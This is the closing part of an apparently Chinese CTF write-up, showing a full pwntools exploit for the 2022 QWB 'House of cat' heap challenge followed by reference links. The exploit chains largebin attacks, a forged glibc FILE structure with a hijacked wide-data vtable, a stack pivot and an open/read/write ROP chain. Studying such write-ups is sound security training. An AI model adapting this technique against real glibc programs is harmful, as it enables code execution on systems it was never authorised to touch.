+<span class="n">ll</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">x</span> <span class="p">:</span> <span class="k">print</span><span class="p">(</span><span class="s1">'</span><span class="se">\x1b</span><span class="s1">[01;38;5;1m'</span> <span class="o">+</span> <span class="n">x</span> <span class="o">+</span> <span class="s1">'</span><span class="se">\x1b</span><span class="s1">[0m'</span><span class="p">)</span>
+<span class="n">context</span><span class="o">.</span><span class="n">terminal</span> <span class="o">=</span> <span class="p">[</span><span class="s1">'gnome-terminal'</span><span class="p">,</span><span class="s1">'-x'</span><span class="p">,</span><span class="s1">'sh'</span><span class="p">,</span><span class="s1">'-c'</span><span class="p">]</span>
+
+<span class="k">def</span> <span class="nf">dbg</span><span class="p">():</span>
+   <span class="n">gdb</span><span class="o">.</span><span class="n">attach</span><span class="p">(</span><span class="n">proc</span><span class="o">.</span><span class="n">pidof</span><span class="p">(</span><span class="n">p</span><span class="p">)[</span><span class="mi">0</span><span class="p">])</span>
+   <span class="n">pause</span><span class="p">()</span>
+
+
+<span class="k">def</span> <span class="nf">add</span><span class="p">(</span><span class="n">idx</span><span class="p">,</span><span class="n">size</span><span class="p">,</span><span class="n">cont</span><span class="p">):</span>
+    <span class="n">sa</span><span class="p">(</span><span class="s1">'mew mew mew~~~~~~'</span><span class="p">,</span> <span class="s1">'CAT | r00t QWB QWXF$</span><span class="se">\xff</span><span class="s1">'</span><span class="p">)</span>
+    <span class="n">sla</span><span class="p">(</span><span class="s1">'plz input your cat choice:</span><span class="se">\n</span><span class="s1">'</span><span class="p">,</span><span class="nb">str</span><span class="p">(</span><span class="mi">1</span><span class="p">))</span>
+    <span class="n">sla</span><span class="p">(</span><span class="s1">'plz input your cat idx:</span><span class="se">\n</span><span class="s1">'</span><span class="p">,</span><span class="nb">str</span><span class="p">(</span><span class="n">idx</span><span class="p">))</span>
+    <span class="n">sla</span><span class="p">(</span><span class="s1">'plz input your cat size:</span><span class="se">\n</span><span class="s1">'</span><span class="p">,</span><span class="nb">str</span><span class="p">(</span><span class="n">size</span><span class="p">))</span>
+    <span class="n">sa</span><span class="p">(</span><span class="s1">'plz input your content:</span><span class="se">\n</span><span class="s1">'</span><span class="p">,</span><span class="n">cont</span><span class="p">)</span>
+<span class="k">def</span> <span class="nf">delete</span><span class="p">(</span><span class="n">idx</span><span class="p">):</span>
+    <span class="n">sa</span><span class="p">(</span><span class="s1">'mew mew mew~~~~~~'</span><span class="p">,</span> <span class="s1">'CAT | r00t QWB QWXF$</span><span class="se">\xff</span><span class="s1">'</span><span class="p">)</span>
+    <span class="n">sla</span><span class="p">(</span><span class="s1">'plz input your cat choice:</span><span class="se">\n</span><span class="s1">'</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="mi">2</span><span class="p">))</span>
+    <span class="n">sla</span><span class="p">(</span><span class="s1">'plz input your cat idx:</span><span class="se">\n</span><span class="s1">'</span><span class="p">,</span><span class="nb">str</span><span class="p">(</span><span class="n">idx</span><span class="p">))</span>
+<span class="k">def</span> <span class="nf">show</span><span class="p">(</span><span class="n">idx</span><span class="p">):</span>
+    <span class="n">sa</span><span class="p">(</span><span class="s1">'mew mew mew~~~~~~'</span><span class="p">,</span> <span class="s1">'CAT | r00t QWB QWXF$</span><span class="se">\xff</span><span class="s1">'</span><span class="p">)</span>
+    <span class="n">sla</span><span class="p">(</span><span class="s1">'plz input your cat choice:</span><span class="se">\n</span><span class="s1">'</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="mi">3</span><span class="p">))</span>
+    <span class="n">sla</span><span class="p">(</span><span class="s1">'plz input your cat idx:</span><span class="se">\n</span><span class="s1">'</span><span class="p">,</span><span class="nb">str</span><span class="p">(</span><span class="n">idx</span><span class="p">))</span>
+<span class="k">def</span> <span class="nf">edit</span><span class="p">(</span><span class="n">idx</span><span class="p">,</span><span class="n">cont</span><span class="p">):</span>
+    <span class="n">sa</span><span class="p">(</span><span class="s1">'mew mew mew~~~~~~'</span><span class="p">,</span> <span class="s1">'CAT | r00t QWB QWXF$</span><span class="se">\xff</span><span class="s1">'</span><span class="p">)</span>
+    <span class="n">sla</span><span class="p">(</span><span class="s1">'plz input your cat choice:</span><span class="se">\n</span><span class="s1">'</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="mi">4</span><span class="p">))</span>
+    <span class="n">sla</span><span class="p">(</span><span class="s1">'plz input your cat idx:</span><span class="se">\n</span><span class="s1">'</span><span class="p">,</span><span class="nb">str</span><span class="p">(</span><span class="n">idx</span><span class="p">))</span>
+    <span class="n">sa</span><span class="p">(</span><span class="s1">'plz input your content:</span><span class="se">\n</span><span class="s1">'</span><span class="p">,</span> <span class="n">cont</span><span class="p">)</span>
+
+<span class="n">sa</span><span class="p">(</span><span class="s1">'mew mew mew~~~~~~'</span><span class="p">,</span><span class="s1">'LOGIN | r00t QWB QWXFadmin'</span><span class="p">)</span>
+
+<span class="n">add</span><span class="p">(</span><span class="mi">14</span><span class="p">,</span><span class="mh">0x450</span><span class="p">,</span><span class="sa">b</span><span class="s1">'o'</span><span class="p">)</span>
+<span class="n">add</span><span class="p">(</span><span class="mi">13</span><span class="p">,</span><span class="mh">0x450</span><span class="p">,</span><span class="sa">b</span><span class="s1">'p'</span><span class="p">)</span>
+<span class="n">delete</span><span class="p">(</span><span class="mi">14</span><span class="p">)</span>
+<span class="n">add</span><span class="p">(</span><span class="mi">12</span><span class="p">,</span><span class="mh">0x460</span><span class="p">,</span><span class="sa">b</span><span class="s1">'n'</span><span class="p">)</span>
+<span class="n">show</span><span class="p">(</span><span class="mi">14</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">'Context:</span><span class="se">\n</span><span class="s1">'</span><span class="p">)</span>
+<span class="n">libc_base</span><span class="o">=</span><span class="n">l64</span><span class="p">()</span><span class="o">-</span><span class="mh">0x21a0e0</span><span class="c1">#-0x10-libc.sym['__malloc_hook']</span>
+<span class="n">li</span><span class="p">(</span><span class="s1">'libc_base = '</span><span class="o">+</span><span class="nb">hex</span><span class="p">(</span><span class="n">libc_base</span><span class="p">))</span>
+
+<span class="n">heap_base</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">"</span><span class="se">\x55</span><span class="s2">"</span><span class="p">)[</span><span class="o">-</span><span class="mi">6</span><span class="p">:]</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span><span class="sa">b</span><span class="s2">"</span><span class="se">\x00</span><span class="s2">"</span><span class="p">))</span><span class="o">-</span><span class="mh">0x290</span>
+<span class="n">li</span><span class="p">(</span><span class="s1">'heap_base = '</span><span class="o">+</span><span class="nb">hex</span><span class="p">(</span><span class="n">heap_base</span><span class="p">))</span>
+
+<span class="n">IO_list_all</span> <span class="o">=</span> <span class="n">libc_base</span><span class="o">+</span><span class="mh">0x21a680</span>
+
+<span class="n">magic_gadget</span> <span class="o">=</span> <span class="n">libc_base</span><span class="o">+</span><span class="mh">0x16a1fa</span>
+<span class="sd">'''</span>
+<span class="sd">&lt;svcudp_reply+26&gt;:    mov    rbp,QWORD PTR [rdi+0x48]</span>
+<span class="sd">&lt;svcudp_reply+30&gt;:    mov    rax,QWORD PTR [rbp+0x18]</span>
+<span class="sd">&lt;svcudp_reply+34&gt;:    lea    r13,[rbp+0x10]</span>
+<span class="sd">&lt;svcudp_reply+38&gt;:    mov    DWORD PTR [rbp+0x10],0x0</span>
+<span class="sd">&lt;svcudp_reply+45&gt;:    mov    rdi,r13</span>
+<span class="sd">&lt;svcudp_reply+48&gt;:    call   QWORD PTR [rax+0x28]</span>
+<span class="sd">'''</span>
+
+<span class="n">IO_2_1_stderr</span> <span class="o">=</span> <span class="n">libc_base</span><span class="o">+</span><span class="mh">0x21a6a0</span> <span class="c1">#_IO_2_1_stderr</span>
+<span class="n">stderr</span> <span class="o">=</span> <span class="n">libc_base</span><span class="o">+</span><span class="mh">0x21a860</span>
+
+<span class="n">IO_wfile_jumps</span> <span class="o">=</span> <span class="n">libc_base</span><span class="o">+</span><span class="mh">0x2160c0</span>
+
+<span class="n">lock</span><span class="o">=</span><span class="n">libc_base</span><span class="o">+</span><span class="mh">0x21ba60</span> <span class="c1">#_lock</span>
+
+<span class="n">add_rsp_ret</span><span class="o">=</span><span class="n">libc_base</span><span class="o">+</span><span class="mh">0x000000000003a889</span>
+<span class="n">leave_ret</span><span class="o">=</span><span class="n">libc_base</span><span class="o">+</span><span class="mh">0x00000000000562ec</span>
+<span class="n">pop_rdi</span><span class="o">=</span><span class="n">libc_base</span><span class="o">+</span><span class="mh">0x000000000002a3e5</span>
+<span class="n">pop_rsi</span><span class="o">=</span><span class="n">libc_base</span><span class="o">+</span><span class="mh">0x000000000002be51</span>
+<span class="n">pop_rdx_r12</span><span class="o">=</span><span class="n">libc_base</span><span class="o">+</span><span class="mh">0x000000000011f497</span>
+<span class="n">pop_rax_ret</span><span class="o">=</span><span class="n">libc_base</span><span class="o">+</span><span class="mh">0x0000000000045eb0</span>
+
+<span class="n">syscall</span><span class="o">=</span><span class="n">libc_base</span><span class="o">+</span><span class="mh">0xea5b9</span>
+<span class="n">read_addr</span><span class="o">=</span><span class="n">libc_base</span><span class="o">+</span><span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s1">'read'</span><span class="p">]</span>
+<span class="n">write_addr</span><span class="o">=</span><span class="n">libc_base</span><span class="o">+</span><span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s1">'write'</span><span class="p">]</span>
+<span class="n">close_addr</span><span class="o">=</span><span class="n">libc_base</span><span class="o">+</span><span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s1">'close'</span><span class="p">]</span>
+
+
+<span class="n">add</span><span class="p">(</span><span class="mi">11</span><span class="p">,</span><span class="mh">0x450</span><span class="p">,</span><span class="sa">b</span><span class="s1">'m'</span><span class="p">)</span>
+
+<span class="c1">#print('==============================================part 4</span>
+<span class="c1">#close(0)</span>
+<span class="n">rop</span><span class="o">=</span><span class="n">p64</span><span class="p">(</span><span class="n">pop_rdi</span><span class="p">)</span>
+<span class="n">rop</span><span class="o">+=</span><span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+<span class="n">rop</span><span class="o">+=</span><span class="n">p64</span><span class="p">(</span><span class="n">close_addr</span><span class="p">)</span>
+<span class="c1">#open('flag',0)</span>
+<span class="n">flag_addr</span><span class="o">=</span><span class="n">heap_base</span><span class="o">+</span><span class="mh">0x1168</span>
+<span class="n">rop</span><span class="o">+=</span><span class="n">p64</span><span class="p">(</span><span class="n">pop_rdi</span><span class="p">)</span>
+<span class="n">rop</span><span class="o">+=</span><span class="n">p64</span><span class="p">(</span><span class="n">flag_addr</span><span class="p">)</span><span class="c1"># 'flag' address</span>
+<span class="n">rop</span><span class="o">+=</span><span class="n">p64</span><span class="p">(</span><span class="n">pop_rsi</span><span class="p">)</span>
+<span class="n">rop</span><span class="o">+=</span><span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+<span class="n">rop</span><span class="o">+=</span><span class="n">p64</span><span class="p">(</span><span class="n">pop_rax_ret</span><span class="p">)</span>
+<span class="n">rop</span><span class="o">+=</span><span class="n">p64</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
+<span class="n">rop</span><span class="o">+=</span><span class="n">p64</span><span class="p">(</span><span class="n">syscall</span><span class="p">)</span>
+
+<span class="c1">#read(0,heap_base+0xb40,0x50)</span>
+<span class="n">rop</span><span class="o">+=</span><span class="n">p64</span><span class="p">(</span><span class="n">pop_rdi</span><span class="p">)</span>
+<span class="n">rop</span><span class="o">+=</span><span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+<span class="n">rop</span><span class="o">+=</span><span class="n">p64</span><span class="p">(</span><span class="n">pop_rsi</span><span class="p">)</span>
+<span class="n">rop</span><span class="o">+=</span><span class="n">p64</span><span class="p">(</span><span class="n">heap_base</span><span class="o">+</span><span class="mh">0xb40</span><span class="p">)</span> <span class="c1">#chunk12-0x10</span>
+<span class="n">rop</span><span class="o">+=</span><span class="n">p64</span><span class="p">(</span><span class="n">pop_rdx_r12</span><span class="p">)</span>
+<span class="n">rop</span><span class="o">+=</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x50</span><span class="p">)</span>
+<span class="n">rop</span><span class="o">+=</span><span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+<span class="n">rop</span><span class="o">+=</span><span class="n">p64</span><span class="p">(</span><span class="n">read_addr</span><span class="p">)</span>
+
+<span class="c1">#write(1,heap_base+0xb40,0x50)</span>
+<span class="n">rop</span><span class="o">+=</span><span class="n">p64</span><span class="p">(</span><span class="n">pop_rdi</span><span class="p">)</span>
+<span class="n">rop</span><span class="o">+=</span><span class="n">p64</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+<span class="n">rop</span><span class="o">+=</span><span class="n">p64</span><span class="p">(</span><span class="n">pop_rsi</span><span class="p">)</span>
+<span class="n">rop</span><span class="o">+=</span><span class="n">p64</span><span class="p">(</span><span class="n">heap_base</span><span class="o">+</span><span class="mh">0xb40</span><span class="p">)</span> <span class="c1">#chunk12-0x10</span>
+<span class="n">rop</span><span class="o">+=</span><span class="n">p64</span><span class="p">(</span><span class="n">pop_rdx_r12</span><span class="p">)</span>
+<span class="n">rop</span><span class="o">+=</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x50</span><span class="p">)</span>
+<span class="n">rop</span><span class="o">+=</span><span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+<span class="n">rop</span><span class="o">+=</span><span class="n">p64</span><span class="p">(</span><span class="n">write_addr</span><span class="p">)</span>
+
+
+<span class="c1">#print('==============================================part 3</span>
+<span class="n">pivot</span><span class="o">=</span><span class="n">p64</span><span class="p">(</span><span class="n">magic_gadget</span><span class="p">)</span> <span class="c1">#call rdi+0x88</span>
+<span class="n">pivot</span><span class="o">+=</span><span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">*</span><span class="mi">4</span>
+<span class="n">pivot</span><span class="o">+=</span><span class="n">p64</span><span class="p">(</span><span class="mh">0xdeadbeef</span><span class="p">)</span>
+<span class="n">pivot</span><span class="o">+=</span><span class="n">p64</span><span class="p">(</span><span class="n">add_rsp_ret</span><span class="p">)</span>
+<span class="n">pivot</span><span class="o">+=</span><span class="n">p64</span><span class="p">(</span><span class="mh">0xdeadbeef</span><span class="p">)</span>
+<span class="n">pivot</span><span class="o">+=</span><span class="n">p64</span><span class="p">(</span><span class="n">heap_base</span><span class="o">+</span><span class="mh">0x1178</span><span class="o">+</span><span class="mh">0x30</span><span class="p">)</span> <span class="c1">#pivot+=p64(0)*4 4</span>
+<span class="n">pivot</span><span class="o">+=</span><span class="n">p64</span><span class="p">(</span><span class="n">leave_ret</span><span class="p">)</span>
+<span class="n">pivot</span><span class="o">+=</span><span class="n">rop</span>
+
+<span class="c1">#print('==============================================part 2</span>
+<span class="n">wide_data</span><span class="o">=</span><span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">*</span><span class="mi">4</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="c1">#_IO_write_ptr</span>
+<span class="n">wide_data</span><span class="o">+=</span><span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">*</span><span class="mi">20</span>
+<span class="n">wide_data</span><span class="o">+=</span><span class="sa">b</span><span class="s1">'flag</span><span class="se">\x00\x00\x00\x00</span><span class="s1">'</span> <span class="c1">#_statep  #flag_addr</span>
+<span class="n">wide_data</span><span class="o">+=</span><span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">*</span><span class="mi">2</span>
+<span class="n">wide_data</span><span class="o">+=</span><span class="n">p64</span><span class="p">(</span><span class="n">heap_base</span><span class="o">+</span><span class="mh">0x1170</span><span class="p">)</span> <span class="c1">#wide_data+=p64(0)*2 1</span>
+<span class="n">wide_data</span><span class="o">+=</span><span class="n">pivot</span>
+
+
+<span class="c1">#print('==============================================part 1</span>
+<span class="n">fake_file</span><span class="o">=</span><span class="n">p64</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span><span class="o">*</span><span class="mi">4</span>
+<span class="n">fake_file</span><span class="o">+=</span><span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">*</span><span class="mi">3</span>
+<span class="n">fake_file</span><span class="o">+=</span><span class="n">p64</span><span class="p">(</span><span class="n">heap_base</span><span class="o">+</span><span class="mh">0xfc0</span><span class="o">+</span><span class="mh">0x1c0</span><span class="o">+</span><span class="mh">0x30</span><span class="p">)</span> <span class="c1">#chunk0+0x1c0 -&gt; chunk0+0x1b0</span>
+<span class="c1">#_IO_save_base</span>
+<span class="n">fake_file</span><span class="o">+=</span><span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">*</span><span class="mi">7</span>
+<span class="n">fake_file</span><span class="o">+=</span><span class="n">p64</span><span class="p">(</span><span class="n">lock</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">*</span><span class="mi">2</span>
+<span class="c1">#_IO_stdfile_2_lock</span>
+<span class="n">fake_file</span><span class="o">+=</span><span class="n">p64</span><span class="p">(</span><span class="n">heap_base</span><span class="o">+</span><span class="mh">0x10a0</span><span class="p">)</span> <span class="c1">#wide_data</span>
+<span class="c1">#_wide_data</span>
+<span class="n">fake_file</span><span class="o">+=</span><span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">*</span><span class="mi">6</span>
+<span class="n">fake_file</span><span class="o">+=</span><span class="n">p64</span><span class="p">(</span><span class="n">IO_wfile_jumps</span><span class="o">+</span><span class="mh">0x10</span><span class="p">)</span>
+<span class="c1">#vtable --&gt; _IO_wfile_seekoff</span>
+<span class="n">fake_file</span><span class="o">+=</span><span class="n">wide_data</span>
+
+
+<span class="n">add</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="mh">0x428</span><span class="p">,</span><span class="n">fake_file</span><span class="p">)</span>
+<span class="n">add</span><span class="p">(</span><span class="mi">15</span><span class="p">,</span><span class="mh">0x460</span><span class="p">,</span><span class="s1">'prevent merge chunk'</span><span class="p">)</span>
+
+<span class="n">add</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mh">0x418</span><span class="p">,</span><span class="sa">b</span><span class="s1">'a'</span><span class="p">)</span>
+<span class="n">delete</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="c1">#ub</span>
+
+<span class="n">add</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span><span class="mh">0x460</span><span class="p">,</span><span class="sa">b</span><span class="s1">'b'</span><span class="p">)</span> <span class="c1">#chunk0 -&gt; largebin</span>
+
+<span class="n">pl</span><span class="o">=</span><span class="n">p64</span><span class="p">(</span><span class="n">libc_base</span><span class="o">+</span><span class="mh">0x21a0d0</span><span class="p">)</span><span class="o">*</span><span class="mi">2</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">IO_list_all</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">stderr</span><span class="o">-</span><span class="mh">0x20</span><span class="p">)</span>
+<span class="n">edit</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="n">pl</span><span class="p">)</span>
+<span class="c1">#main_arena+1104  main_arena+1104</span>
+<span class="c1">#IO_list_all      stderr-0x20</span>
+
+<span class="n">delete</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="c1">#ub</span>
+<span class="n">add</span><span class="p">(</span><span class="mi">3</span><span class="p">,</span><span class="mh">0x440</span><span class="p">,</span><span class="sa">b</span><span class="s1">'c'</span><span class="p">)</span> <span class="c1">#attack</span>
+
+
+<span class="n">add</span><span class="p">(</span><span class="mi">4</span><span class="p">,</span><span class="mh">0x418</span><span class="p">,</span><span class="sa">b</span><span class="s1">'d'</span><span class="p">)</span> <span class="c1">#r chunk1</span>
+
+<span class="n">add</span><span class="p">(</span><span class="mi">7</span><span class="p">,</span><span class="mh">0x460</span><span class="p">,</span><span class="sa">b</span><span class="s1">'g'</span><span class="p">)</span>
+<span class="n">add</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span><span class="mh">0x430</span><span class="p">,</span><span class="sa">b</span><span class="s1">'h'</span><span class="p">)</span>
+<span class="n">delete</span><span class="p">(</span><span class="mi">3</span><span class="p">)</span>
+<span class="n">add</span><span class="p">(</span><span class="mi">9</span><span class="p">,</span><span class="mh">0x460</span><span class="p">,</span><span class="sa">b</span><span class="s1">'i'</span><span class="p">)</span> <span class="c1">#chunk3 -&gt; largebin</span>
+
+<span class="n">pl</span><span class="o">=</span><span class="n">p64</span><span class="p">(</span><span class="n">heap_base</span><span class="o">+</span><span class="mh">0x2e20</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">libc_base</span><span class="o">+</span><span class="mh">0x21a0e0</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">heap_base</span><span class="o">+</span><span class="mh">0x2e20</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">heap_base</span><span class="o">+</span><span class="mh">0x3263</span><span class="o">-</span><span class="mh">0x20</span><span class="p">)</span>
+<span class="n">edit</span><span class="p">(</span><span class="mi">3</span><span class="p">,</span><span class="n">pl</span><span class="p">)</span>
+<span class="c1">#chunk9+0x30  main_arena+1120</span>
+<span class="c1">#chunk9+0x30  &amp;TopChunk_Size+3 -0x20</span>
+
+<span class="n">delete</span><span class="p">(</span><span class="mi">8</span><span class="p">)</span> <span class="c1">#ub</span>
+
+<span class="n">delete</span><span class="p">(</span><span class="mi">14</span><span class="p">)</span> 
+<span class="n">add</span><span class="p">(</span><span class="mi">10</span><span class="p">,</span><span class="mh">0x450</span><span class="p">,</span><span class="sa">b</span><span class="s1">'a'</span><span class="p">)</span> <span class="c1">#attack</span>
+
+<span class="n">p</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="s2">"mew mew mew~~~~~~</span><span class="se">\n</span><span class="s2">"</span><span class="p">,</span><span class="s1">'CAT | r00t QWB QWXF$</span><span class="se">\xff</span><span class="s1">'</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">"plz input your cat choice:</span><span class="se">\n</span><span class="s2">"</span><span class="p">,</span><span class="nb">str</span><span class="p">(</span><span class="mi">1</span><span class="p">))</span>
+<span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">"plz input your cat idx:</span><span class="se">\n</span><span class="s2">"</span><span class="p">,</span><span class="nb">str</span><span class="p">(</span><span class="mi">6</span><span class="p">))</span>
+<span class="n">dbg</span><span class="p">()</span>
+<span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">"plz input your cat size:</span><span class="se">\n</span><span class="s2">"</span><span class="p">,</span><span class="nb">str</span><span class="p">(</span><span class="mh">0x46f</span><span class="p">))</span>
+
+
+
+<span class="n">itr</span><span class="p">()</span>
+</pre></div>
+<p>‍</p>
+<p>‍</p>
+<h4 data-content="1" id="3ca4e5867310b0db2578d82d7ed6e25a">参考：</h4>
+<p><a href="https://bbs.kanxue.com/thread-273895.htm" target="_blank">House of cat新型glibc中IO利用手法解析 &amp;&amp; 第六届强网杯House of cat详解</a></p>
+<p><a href="https://zikh26.github.io/posts/7de5a5b7.html#%E5%88%A9%E7%94%A8%E6%80%9D%E8%B7%AF" target="_blank">house of cat -2022强网杯pwn复现 | ZIKH26's Blog</a></p>
+<p><a href="https://bbs.kanxue.com/thread-272098.htm#msg_header_h3_32" target="_blank">CTF 中 glibc堆利用 及 IO_FILE 总结</a></p>
+<p>‍</p>
+</div>
+</div>
